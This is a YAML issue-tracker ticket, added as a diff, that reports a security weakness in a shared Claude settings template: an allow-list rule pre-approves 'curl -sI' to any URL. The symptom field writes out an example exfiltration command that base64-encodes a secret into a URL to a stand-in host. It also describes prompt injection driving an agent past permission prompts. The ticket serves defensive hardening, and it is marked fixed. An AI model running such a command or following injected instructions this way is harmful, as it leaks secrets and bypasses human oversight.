@@ -1,0 +1,63 @@
+schemaVersion: 1
+id: U-20261031-006
+kind: manual
+title: Upstream request from co-security
+priority: normal
+status: done
+attempts: 0
+created_at: '2026-10-31T10:24:43.934+09:00'
+history:
+  - at: '2026-10-31T10:24:43.934+09:00'
+    from: null
+    to: backlog
+  - at: '2026-10-31T17:03:27.574+09:00'
+    from: backlog
+    to: waiting
+  - at: '2026-10-31T18:28:45.372+09:00'
+    from: waiting
+    to: review
+  - at: '2026-10-31T18:28:45.372+09:00'
+    from: review
+    to: done
+result: >-
+  Fixed in template security hardening batch (design
+  2026-10-31-template-security-hardening-design, PR #1776): see PR body for
+  per-ticket fix evidence; settings permission-surface reductions are
+  fail-closed.
+error: null
+upstream:
+  project: co-security
+  variant: co-security
+  template_version: 0.25.0
+  source: project/co-security
+  trust: untrusted
+  suspected_layer: L1
+  symptom: >-
+    templates/common/.claude/settings.json allow list ships Bash(curl -sI *),
+    which pre-approves HEAD requests to arbitrary URLs for every variant
+    instance. This is a covert-channel primitive: injected instructions can
+    exfiltrate secrets in the URL path/query (curl -sI https://host/$(secret |
+    base64)) or probe internal hosts/metadata endpoints without any permission
+    prompt. Legitimate use (link health checks) can be covered by enumerated
+    hosts or left to per-use approval.
+  affected_paths:
+    - .claude/settings.json
+  identity_source: cwd
+  triage: ready
+  flagged: true
+  triage_reasons:
+    - needs_human_review
+    - info:in_last_delivery .claude/settings.json=false
+  dedupe_key: 45d0e45c7658ac52cbfddecf096be76981067e0ed4b35af776f5f6bc0fa2f524
+  duplicates:
+    - project: co-security
+      at: '2026-10-31T10:24:43.934+09:00'
+  resolution:
+    outcome: fixed
+    pr_url: https://github.com/5throck/ai-workspace-standards/pull/1776
+    template_version: unreleased
+    summary: >-
+      Fixed in template security hardening batch (design
+      2026-10-31-template-security-hardening-design, PR #1776): see PR body for
+      per-ticket fix evidence; settings permission-surface reductions are
+      fail-closed.
